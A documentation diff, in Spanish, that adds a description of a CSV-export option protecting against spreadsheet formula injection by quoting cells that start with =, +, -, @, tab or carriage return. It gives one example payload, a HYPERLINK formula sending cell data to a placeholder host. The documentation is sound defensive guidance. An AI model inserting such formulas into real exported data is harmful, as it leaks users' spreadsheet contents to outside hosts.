@@ -570,6 +570,18 @@ como archivo** y **Copiar al portapapeles** que hay debajo siguen esa elección:
   **Separador** (coma, punto y coma o tabulador) se aplican al CSV guardado o
   copiado desde este menú y a Exportar todas las filas en CSV. No cambian Copiar
   como CSV del menú contextual.
+- **Proteger contra fórmulas de hojas de cálculo**, desactivada por defecto,
+  pone un `'` delante de cada celda de texto y nombre de columna que empieza
+  por `=`, `+`, `-`, `@`, un tabulador o un retorno de carro en el CSV guardado
+  o copiado desde este menú y en Exportar todas las filas en CSV. Una hoja de
+  cálculo ejecuta esa celda como fórmula al abrir el archivo, y los datos de un
+  servidor pueden traerla a propósito, por ejemplo
+  `=HYPERLINK("https://example.com/?"&A1)`. Con la opción activada, la hoja
+  muestra el texto; los números no cambian. Déjala desactivada cuando el
+  archivo lo lee otro programa, que vería el `'`. Las carpetas de exportación
+  de varias tablas (Exportar datos) nunca cambian sus valores. Para Copiar y
+  Copiar como CSV, usa el ajuste **Proteger las celdas copiadas contra fórmulas
+  de hojas de cálculo** en Configuración > General > Cuadrícula de datos.
 
 El título sobre las opciones indica qué escriben los formatos, por ejemplo
 "Exportar 12 filas seleccionadas, 4 columnas", y el aviso tras guardar o copiar
